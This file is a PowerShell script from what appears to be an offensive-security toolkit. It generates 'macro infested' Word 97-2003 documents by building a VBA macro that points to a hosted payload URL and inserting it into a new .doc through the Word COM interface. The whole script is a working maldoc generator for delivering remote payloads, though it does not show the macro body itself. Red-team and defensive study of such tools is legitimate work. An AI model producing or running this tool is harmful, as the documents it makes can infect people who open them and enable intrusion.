function Get-MacroInfestedWordDoc {
#.SYNOPSIS
# Generate Macro Infested Word 97-2003 Documents (.doc)
# ARBITRARY VERSION NUMBER:  3.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# TBA
# 
# Parameters:
#   -DocumentName   -->  Name of the malicious Word Document (.doc)
#   -PayloadURL     -->  URL of the hosted payload that the macro points to
#   -MacroContents  -->  Advanced: User input macro instead of the generated one
#   -Help           -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory
    

    Param(
        [string]$DocumentName,
        [string]$PayloadURL,
        [string]$MacroContents,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return (Get-Help Generate-WordTemplate) }


    # Minor Error Correction (To-Do)
    if (!$MacroContents -and !$PayloadURL) { return (Write-Host 'Input macro contents or payload URL.' -ForegroundColor Red) }
    if ($PayloadURL -notlike "http*")      { return (Write-Host 'Payload URL not in correct format.' -ForegroundColor Red)   }
    if (!$DocumentName)                    { return (Write-Host 'Document name not input.' -ForegroundColor Red)             } 
    if ($DocumentName -notlike '*.doc')    { return (Write-Host 'Document must be a .doc file.' -ForegroundColor Red)        }
    

    # Establish Variables
    $libBuildMacro = "$PSScriptRoot/lib/Build-VBAMacro.ps1"
    $libVBASupport = "$PSScriptRoot/lib/Test-VBASupport.ps1"
    $OutputPath    = "$PSScriptRoot/outputs/classicMacros"


    # Path Validation
    $Libs = @()
    if (Test-Path -LiteralPath $libVBASupport) { $Libs += (Get-Item -LiteralPath $libVBASupport).FullName }
    else { return (Write-Host "Unable to find 'Test-VBASupport.ps1'" -ForegroundColor Red) }
    if (Test-Path -LiteralPath $libBuildMacro) { $Libs += (Get-Item -LiteralPath $libBuildMacro).FullName }
    else { return (Write-Host "Unable to find 'Build-VBAMacro.ps1.'" -ForegroundColor Red) }


    if (Test-Path -LiteralPath $OutputPath) { $OutputPath = (Get-Item -LiteralPath $OutputPath).FullName }
    else { return (Write-Host 'Failed to validate output path.' -ForegroundColor Red) }

    $DocumentPath = "$OutputPath\$DocumentName"
    if (Test-Path -LiteralPath $DocumentPath) { return (Write-Host 'Target document already exists.' -ForegroundColor Red) }


    # Importing Libraries
    Write-Host '[+] Importing Libraries...' -ForegroundColor Yellow
    foreach ($Library in $Libs) {
        . $Library
        Write-Host " o  $((Get-Item -LiteralPath $Library).Name)"
        Start-Sleep -Milliseconds 750
    }


    # Validate System Supports VBA Projects
    $VBAsupport = Test-VBASupport -Silent
    if ($VBAsupport) { Write-Host "`n[+] System supports VBA project generation.`n" -ForegroundColor Yellow ; Start-Sleep -Milliseconds 750 }
    else { return (Write-Host "`n[-] VBA project generation unsupported.  Run 'Test-VBASupport' for more information." -ForegroundColor Red) }


    # Generate Macro if not Specified
    if (!$MacroContents) {

        Write-Host "[+] Generating VBA Macro..." -ForegroundColor Yellow
        Write-Host " o  Pointing to '$PayloadURL'..."
        $MacroContents = Build-VBAMacro -PayloadURL $PayloadURL -PrivateSub
        Write-Host " o  Done.`n"
        Start-Sleep -Milliseconds 750
    }


    Try {
        Write-Host "[+] Generating Macro Infested Word 97-2003 Document (.doc)..." -ForegroundColor Yellow

        $Word = New-Object -ComObject "Word.Application"
        Write-Host " o  Creating '$DocumentName'..."
        Start-Sleep -Milliseconds 1500

        $WordDocument = $Word.Documents.Add()
        Write-Host " o  Opening document with Word Application API..."
        Start-Sleep -Milliseconds 1500

        $WordDocument.SaveAs($DocumentPath, 0)
        Start-Sleep -Milliseconds 500

        $InsertMac = $WordDocument.VBProject.VBComponents.Item(1)
        Write-Host " o  Initializing VB components..."
        Start-Sleep -Milliseconds 1500

        $InsertMac.CodeModule.AddFromString($MacroContents)
        Write-Host " o  Inserting macro contents..."
        Start-Sleep -Milliseconds 1500

        Write-Host " o  Attempting to save document..."
        $WordDocument.SaveAs($DocumentPath, 0)
        $Word.Quit()

        Write-Host " o  Cleaning up..."
        Start-Sleep -Milliseconds 1500
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
    }

    Catch { return ('[-] An error occured.') }


    if (Test-Path -LiteralPath $DocumentPath) { Write-Host " o  '$DocumentName' was successfully generated.`n" }
    else { Write-Host "`n[-] '$DocumentName' failed to create.`n" -ForegroundColor Red; $DocumentName = '<N/A>' }
    

    # Summary
    Write-Host '[+] Summary:' -ForegroundColor Yellow
    Write-Host " o  Macro Payload URL       : '$PayloadURL'"
    Write-Host " o  Macro Infested Document : '$DocumentName'`n"
}